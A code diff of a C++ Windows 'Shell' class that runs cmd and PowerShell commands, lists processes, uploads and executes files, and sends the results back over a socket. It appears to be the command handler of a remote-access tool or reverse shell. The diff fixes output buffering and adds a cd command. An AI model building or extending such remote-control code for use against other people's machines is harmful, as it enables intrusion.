@@ -30,14 +30,14 @@ std::string Shell::return_command(const std::string cmd)
 
 void Shell::pwd(SOCKET* client)
 {
-	std::string ret = return_command("chdir").c_str();
-	send(*client, ret.c_str(), sizeof(ret), 0);
+	char buffer[BUFFER_LEN] = { 0 };
+	_getcwd(buffer, BUFFER_LEN);
+	send(*client, buffer, BUFFER_LEN, 0);
 }
 void Shell::ls(SOCKET* client)
 {
 	std::string ret = return_command("dir /b");
-	send(*client, "HUGE_BUFFER", BUFFER_LEN, 0);
-	send(*client, ("\n"+ret).c_str(), HUGE, 0);
+	send(*client, ("\n"+ret).c_str(), BUFFER_LEN, 0);
 }
 void Shell::runCMD(SOCKET* client,const std::vector<std::string> args)
 {
@@ -51,8 +51,7 @@ void Shell::runCMD(SOCKET* client,const std::vector<std::string> args)
 	if (ret != "") 
 	{ 
 		
-		send(*client, "HUGE_BUFFER", BUFFER_LEN, 0);
-		send(*client, ret.c_str(), HUGE, 0); 
+		send(*client, ret.c_str(), BUFFER_LEN, 0); 
 	}
 }
 void Shell::runPOWERSHELL(SOCKET* client, const std::vector<std::string> args)
@@ -66,11 +65,13 @@ void Shell::runPOWERSHELL(SOCKET* client, const std::vector<std::string> args)
 	if (ret != "") 
 	{
 
-		send(*client, "HUGE_BUFFER", BUFFER_LEN, 0);
-		send(*client, ret.c_str(), HUGE, 0);
+		send(*client, ret.c_str(), BUFFER_LEN, 0);
 	}
 }
-
+void Shell::cd(Client* client, const std::string directory)
+{
+	_chdir(directory.c_str());
+}
 void Shell::uploadToClientExe(Client* client, std::string filename)
 {
 	if (Transfer::uploadToClient(client, filename))
@@ -104,6 +105,7 @@ void Shell::exe(Client* client, const std::string filename)
 
 void Shell::ps(Client* client)
 {
+
 	std::string ret = Shell::return_command("tasklist");
 	std::cout << ret << std::endl;
 	if (ret != "")
